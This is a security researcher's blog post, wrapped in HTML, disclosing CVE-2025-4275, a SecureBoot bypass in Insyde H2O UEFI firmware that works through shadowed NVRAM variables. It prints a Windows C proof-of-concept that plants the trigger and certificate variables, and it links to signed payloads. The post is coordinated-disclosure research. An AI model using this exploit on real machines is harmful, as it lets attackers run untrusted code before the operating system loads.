@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+        <meta content="text/html; charset=UTF-8" http-equiv="content-type"/>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+        
+        
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+
+        <title>Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1</title>
+        
+        <meta name="title" content="Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1">
+        
+        
+        <meta name="generator" content="Zola v0.16.1">
+
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://coderush.me/hydroph0bia-part1/">
+        <meta property="og:site_name" content="">
+        <meta property="og:title" content="Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1">
+        
+        
+
+        
+        
+        
+        <link rel="canonical" href="https://coderush.me/hydroph0bia-part1/">
+        
+        <script type="application/ld+json">
+            {
+                
+                "url":"https://coderush.me/hydroph0bia-part1/",
+                "@type":"WebSite",
+                "headline":"Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1",
+                "name":"Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1",
+                
+                "@context":"https://schema.org"
+            }
+        </script>
+        
+        
+        
+        <link rel="stylesheet" href="https://coderush.me/style.css"/>
+        
+    </head>
+    <body theme="auto">
+        <div class="w">
+            <header>
+                
+                
+<p><a href="..">..</a>/hydroph0bia-part1</p>
+<p class="post-meta"><time datetime="2025-06-10">2025-06-10</time></p>
+<h1>Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1</h1>
+
+            </header>
+            <main class="page-content" aria-label="Content">
+                
+
+
+
+<img src=".&#x2F;hp1_logo.png" alt="Hydroph0bia logo" />
+<p>This post will be about a vulnerability I dubbed Hydroph0bia (as a pun on Insyde H2O) aka CVE-2025-4275 or INSYDE-SA-2025002.</p>
+<h1 id="intro">Intro</h1>
+<p>Once upon an evening a relative handed me over his <a href="https://consumer.huawei.com/sa-en/laptops/matebook-14-2023/specs/">HUAWEI Matebook 14 2023</a>, an entry-level PC laptop based on Intel Core i5-1240P and running Insyde H2O-based UEFI-compatible firmware with SecureBoot, firmware password, and other security features expected from a modern PC.</p>
+<p>I had a ton of free time after leaving California and returning to Germany, and my UEFI reversing skills got a bit rusty and needed a refresh, so I decided to invest some time into checking how robust those security technologies really are against somewhat capable and/or experienced attacker.</p>
+<p>The result is self evident - <strong>they sadly are not</strong>. The firmware can be persuaded to trust any arbitrary external application or capsule signed by arbitrary certificate, and the only capabilities reqired for it are "can put files onto EFI System Partition" and "can create new NVRAM variables", both of which are achievable by a local privilege escalation<sup class="footnote-reference"><a href="#1">1</a></sup> in Windows or Linux.</p>
+<h1 id="nvram">NVRAM?</h1>
+<p>As all of you might already know, UEFI provides an abstract interface to a non-volatile variable storage it calls NVRAM (Non-Volatile Random Access Memory). The interface itself is very old (a vintage of <a href="https://vzimmer.blogspot.com/2018/10/ghosts-of.html">Intel Boot Initiative of 1998</a>), prone to <a href="https://www.binarly.io/blog/efixplorer-hunting-uefi-firmware-nvram-vulnerabilities">many issues big and small</a>, and is <em>an API so nice you have to call it twice</em>.</p>
+<p>It is also prone to an issue I've discovered a while ago and <a href="https://x.com/NikolajSchlej/status/1584456875126362112">ranted about on Twitter</a> - <em>"shadowing"</em>, a situation where a non-volatile variable with a given name and GUID can both prevent creation of a volatile variable with the same name and GUID (which immediately defeats the <em>"attributes are a part of the key"</em> assertion made by UEFI specification), and be consumed instead said volatile variable (that could not have been created previously, because a non-volatile one already exists) at any place where the volatile variable had been expected.</p>
+<p><strong>Spoiler alert</strong>: the vulnerability I'm describing here is <strong>exactly</strong> of this kind, and it could not be possible without UEFI NVRAM interface being a mess (storing <em>volatile</em> variables in a storage with <em>Non-Volatile</em> in the name is both ironic and dangerous, but probably just fine for 1998).</p>
+<blockquote>
+<p>It would seem the universe does not like its peas mixed with its porridge. <a href="https://bioshock.fandom.com/wiki/The_Source_of_Her_Power">Rosalind Lutece, Bioshock Infinite</a></p>
+</blockquote>
+<h1 id="secureboot">SecureBoot?</h1>
+<p>Another quirk of early days of UEFI is that the ability to verify signatures on applications and drivers coming from outside of the firmware had not originally been present in EFI 1.1 or UEFI 2.0, but was added (with a heavy push by Microsoft) later in 2012, almost a full year after the whole PC industry moved to UEFI-compatible firmware. This means that every IBV (Independent BIOS Vendor) had to invent a firmware update subsystem for their platform first, then make it work reliably enough to be released to the world, then, after a year, marry it with SecureBoot, SMM-based SetVariable, new kinds of authenticated NVRAM variables, and all the other tech required to support SecureBoot in a spec-compliant way.</p>
+<p>This situation lead to stuff being rushed out of the door in a rather sorry state, many edge cases (like using TE image format instead of PE) being completely untested, Authenticode verification code being broken in many ways and prone to integer overflows at every arithmetic operation, etc.</p>
+<h1 id="vulnerability">Vulnerability?</h1>
+<p>I've stalled long enough for the actual vulnerability details, now it is time to dig into the issue. But first, a super-quick refresher on how SecureBoot works in any Insyde H2O-based firmware:</p>
+<ul>
+<li>A driver called BdsDxe enumerates all things that need to be executed from outside of the firmware, and are therefore untrusted - Option ROMs, UEFI drivers, UEFI applications and the OS bootloader that needs to be executed after the firmware is done with itself.</li>
+<li>To actually perform the Authenticode signature verification BdsDxe calls into another driver - SecurityStubDxe (let the name not deceive you, there's nothing <em>stub</em> about it), then depending on the results either transfers control to that verified thing, or ignores it silently, or loudly complains to the user about SecureBoot failure. This uses the spec-defined authenticated NVRAM variables relevant to SecureBoot - <em>db</em>, <em>dbx</em>, <em>KEK</em>, <em>PK</em>, <em>SetupMode</em> and so on.</li>
+<li>The firmware update mechanism is also using an UEFI application called <em>isflash.bin</em>, that the updater application in the OS places onto EFI System Partition together with the update capsule. The UEFI application is signed by an Insyde certificate, and the public portion of it is stored inside the DXE volume.</li>
+<li>However, it is BdsDxe that reads the signing certificate for the firmware updater, and SecurityStubDxe that performs Authenticode verification, so there needs to be a mechanism for BdsDxe to rely the certificate to SecurityStubDxe, yet out of all the available options Insyde engineers from 2012 choose one of the worst - <strong>NVRAM</strong>.</li>
+</ul>
+<p>The expected way the firmware update should work is as follows:</p>
+<ol>
+<li>
+<p>A driver called SecureFlashDxe sets a trigger variable for BdsDxe to load a certificate into a volatile NVRAM variable.</p>
+</li>
+<li>
+<p>BdsDxe does that by setting two variables - <em>SecureFlashSetupMode</em>  trigger, and <em>SecureFlashCertData</em> with a certificate in EFI_SIGNATURE_LIST format.
+<img src=".&#x2F;hp1_loadcerts.png" alt="LoadCertificateToVariable function in BdsDxe decompiled by IDA 9.1 with efiXplorer" />
+</p>
+</li>
+<li>
+<p>SecurityStubDxe reads the trigger and the certificate and if they are both present attempts the verification process. It does not check either variables to be volatile or non-volatile, and uses a library function to read them instead of calling the GetVariable runtime service directly.
+<img src=".&#x2F;hp1_verify.png" alt="VerifyBySecureFlashSignature function in SecurityStubDxe decompiled by IDA 9.1 with efiXplorer" />
+</p>
+</li>
+</ol>
+<p><em>What could go wrong here?</em> Well, if we are able to create our own non-volatile <em>SecureFlashSetupMode</em> and <em>SecureFlashCertData</em> without triggering any other steps above, SecurityStubDxe will happily see those as if BdsDxe created them, and will blindly trust anything that is correctly signed with the provided certificate, bypassing both SecureBoot and Insyde signature check on <em>isflash.bin</em>.</p>
+<p>I wrote a small Windows program to do so, here it is in full:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">windows.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdint.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">static unsigned char</span><span> esl[] = {
+</span><span>    </span><span style="color:#d08770;">0xa1</span><span>, </span><span style="color:#d08770;">0x59</span><span>, </span><span style="color:#d08770;">0xc0</span><span>, </span><span style="color:#d08770;">0xa5</span><span>, </span><span style="color:#d08770;">0xe4</span><span>, </span><span style="color:#d08770;">0x94</span><span>, </span><span style="color:#d08770;">0xa7</span><span>, </span><span style="color:#d08770;">0x4a</span><span>, </span><span style="color:#d08770;">0x87</span><span>, </span><span style="color:#d08770;">0xb5</span><span>, </span><span style="color:#d08770;">0xab</span><span>, </span><span style="color:#d08770;">0x15</span><span>,
+</span><span>    ...
+</span><span>    </span><span style="color:#d08770;">0xb4</span><span>, </span><span style="color:#d08770;">0xf5</span><span>, </span><span style="color:#d08770;">0x2d</span><span>, </span><span style="color:#d08770;">0x68</span><span>, </span><span style="color:#d08770;">0xe8
+</span><span>};
+</span><span style="color:#b48ead;">const unsigned int</span><span> esl_len = </span><span style="color:#d08770;">857</span><span>;
+</span><span>
+</span><span style="color:#b48ead;">static const char</span><span>* trigger_var = &quot;</span><span style="color:#a3be8c;">SecureFlashSetupMode</span><span>&quot;;
+</span><span style="color:#b48ead;">static const char</span><span>* cert_var = &quot;</span><span style="color:#a3be8c;">SecureFlashCertData</span><span>&quot;;
+</span><span style="color:#b48ead;">static const char</span><span>* guid = &quot;</span><span style="color:#a3be8c;">{382AF2BB-FFFF-ABCD-AAEE-CCE099338877}</span><span>&quot;;
+</span><span style="color:#b48ead;">static char</span><span> trigger = </span><span style="color:#d08770;">1</span><span>;
+</span><span>
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">obtain_privilege</span><span>()
+</span><span>{
+</span><span>    HANDLE hToken;
+</span><span>    TOKEN_PRIVILEGES tkp;
+</span><span>    
+</span><span>    </span><span style="color:#bf616a;">OpenProcessToken</span><span>(</span><span style="color:#bf616a;">GetCurrentProcess</span><span>(), 
+</span><span>         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+</span><span>    </span><span style="color:#bf616a;">LookupPrivilegeValue</span><span>(</span><span style="color:#d08770;">NULL</span><span>, 
+</span><span>         SE_SYSTEM_ENVIRONMENT_NAME, &amp;tkp.</span><span style="color:#bf616a;">Privileges</span><span>[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">Luid</span><span>);
+</span><span>    tkp.</span><span style="color:#bf616a;">PrivilegeCount </span><span>= </span><span style="color:#d08770;">1</span><span>;
+</span><span>    tkp.</span><span style="color:#bf616a;">Privileges</span><span>[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">Attributes </span><span>= SE_PRIVILEGE_ENABLED;
+</span><span>    </span><span style="color:#bf616a;">AdjustTokenPrivileges</span><span>(hToken, </span><span style="color:#d08770;">FALSE</span><span>, &amp;tkp, </span><span style="color:#d08770;">0</span><span>, (PTOKEN_PRIVILEGES)</span><span style="color:#d08770;">NULL</span><span>, </span><span style="color:#d08770;">0</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">char </span><span>*</span><span style="color:#bf616a;">argv</span><span>[]) 
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(argc != </span><span style="color:#d08770;">2</span><span>) {
+</span><span>        </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Usage: sfcd set   - set the hardcoded certificate </span><span>&quot;
+</span><span>               &quot;</span><span style="color:#a3be8c;">and trigger NVRAM variables</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>               &quot;</span><span style="color:#a3be8c;">       sfcd clear - clear the currently set certificate </span><span>&quot;
+</span><span>               &quot;</span><span style="color:#a3be8c;">and trigger NVRAM variables</span><span style="color:#96b5b4;">\n\n</span><span>&quot;);
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">return</span><span> EXIT_SUCCESS;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">obtain_privilege</span><span>();
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Set variables
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#96b5b4;">memcmp</span><span>(argv[</span><span style="color:#d08770;">1</span><span>], &quot;</span><span style="color:#a3be8c;">set</span><span>&quot;, </span><span style="color:#d08770;">4</span><span>) == </span><span style="color:#d08770;">0</span><span>) {
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">SetFirmwareEnvironmentVariableA</span><span>(cert_var, guid, esl, esl_len)) {
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> had been set</span><span style="color:#96b5b4;">\n</span><span>&quot;, cert_var);
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Failed to set </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">, code </span><span style="color:#d08770;">%u</span><span style="color:#96b5b4;">\n</span><span>&quot;, cert_var, 
+</span><span>                 (</span><span style="color:#b48ead;">unsigned</span><span>)</span><span style="color:#bf616a;">GetLastError</span><span>());
+</span><span>            </span><span style="color:#b48ead;">return</span><span> EXIT_FAILURE;
+</span><span>        }
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">SetFirmwareEnvironmentVariableA</span><span>(trigger_var, guid, 
+</span><span>               &amp;trigger, sizeof(trigger))) {
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> had been set</span><span style="color:#96b5b4;">\n</span><span>&quot;, trigger_var);
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Failed to set </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">, code </span><span style="color:#d08770;">%u</span><span style="color:#96b5b4;">\n</span><span>&quot;, trigger_var, 
+</span><span>                 (</span><span style="color:#b48ead;">unsigned</span><span>)</span><span style="color:#bf616a;">GetLastError</span><span>());
+</span><span>            </span><span style="color:#b48ead;">return</span><span> EXIT_FAILURE;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style="color:#65737e;">// Clear variables
+</span><span>    </span><span style="color:#b48ead;">else if </span><span>(</span><span style="color:#96b5b4;">memcmp</span><span>(argv[</span><span style="color:#d08770;">1</span><span>], &quot;</span><span style="color:#a3be8c;">clear</span><span>&quot;, </span><span style="color:#d08770;">6</span><span>) == </span><span style="color:#d08770;">0</span><span>) {
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">SetFirmwareEnvironmentVariableA</span><span>(cert_var, guid, esl, </span><span style="color:#d08770;">0</span><span>)) {
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> had been cleared</span><span style="color:#96b5b4;">\n</span><span>&quot;, cert_var);
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Failed to clear </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">: </span><span style="color:#d08770;">%u</span><span style="color:#96b5b4;">\n</span><span>&quot;, cert_var, 
+</span><span>                 (</span><span style="color:#b48ead;">unsigned</span><span>)</span><span style="color:#bf616a;">GetLastError</span><span>());
+</span><span>            </span><span style="color:#b48ead;">return</span><span> EXIT_FAILURE;
+</span><span>        }
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">SetFirmwareEnvironmentVariableA</span><span>(trigger_var, guid, &amp;trigger, </span><span style="color:#d08770;">0</span><span>)) {
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> had been cleared</span><span style="color:#96b5b4;">\n</span><span>&quot;, trigger_var);
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Failed to clear </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">: </span><span style="color:#d08770;">%u</span><span style="color:#96b5b4;">\n</span><span>&quot;, trigger_var, 
+</span><span>                 (</span><span style="color:#b48ead;">unsigned</span><span>)</span><span style="color:#bf616a;">GetLastError</span><span>());
+</span><span>            </span><span style="color:#b48ead;">return</span><span> EXIT_FAILURE;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style="color:#b48ead;">else </span><span>{
+</span><span>        </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Unknown command</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>        </span><span style="color:#b48ead;">return</span><span> EXIT_FAILURE;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return</span><span> EXIT_SUCCESS;
+</span><span>}
+</span></code></pre>
+<p>Running this tool on Windows from Administrator makes the firmware trust everything signed by our certificate, including UEFI drivers that we can then run rather early in BDS phase by using the DriverXXXX mechanism. Here is an example of using a signed CrScreenshotDxe driver to get a screenshot from BIOS Setup screen with SecureBoot enabled.
+<img src=".&#x2F;hp1_screenshot.png" alt="Screenshot of BIOS Setup screen with SecureBoot enabled" />
+</p>
+<h1 id="outro">Outro</h1>
+<p>This post is a result of coordinated responsible disclosure with <a href="https://www.kb.cert.org/vuls/">CERT Coordination Center</a>.
+I would like to thank Vijay Sarvepalli (Security Solutions Architect, Carnegie Mellon University) for his help with reporting and coordination, and Tim Lewis (CTO, Insyde Software) for promptly fixing the vulnerability after my initial report 90 days ago.</p>
+<p>I'd like to also thank Alex Matrosov and his team at <a href="https://binarly.io">Binarly.io</a> for their hard work on improving UEFI security in general, and for development and support of <a href="https://github.com/binarly-io/efiXplorer">efiXplorer</a>, that makes reversing UEFI components much more fun and much less challenging.</p>
+<p>There will be a part two of this post where we'll <a href="https://youtu.be/1uJF44S0LQw">use the vulnerability to hijack the firmware update process and obtain full control over the DXE volume</a>. Stay tuned.</p>
+<h1 id="links">Links</h1>
+<p>SFCD tool <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/sfcd/sfcd.c">source</a> and <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/sfcd/SFCD.exe">binary</a>, original <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/bios_images/original.bin">BIOS region dump</a>, and custom-cert-signed <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/shell_signed.efi">UEFI Shell</a> and <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/crscreenshotdxe_signed.efi">CrScreenshotDxe</a> are on GitHub.</p>
+<hr data-content="footnotes" \>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>it is useful to assume the OS to be under full attacker control for any kind of firmware security research, with LPEs being dirt-cheap and users still willing to run unknown software downloaded directly from the Web that barrier of entry might as well not exist.</p>
+</div>
+
+
+            </main>
+            <footer>
+                
+<p class="taxonomies">
+
+</p>
+
+                
+            </footer>
+        </div>
+    </body>
+</html>
+        
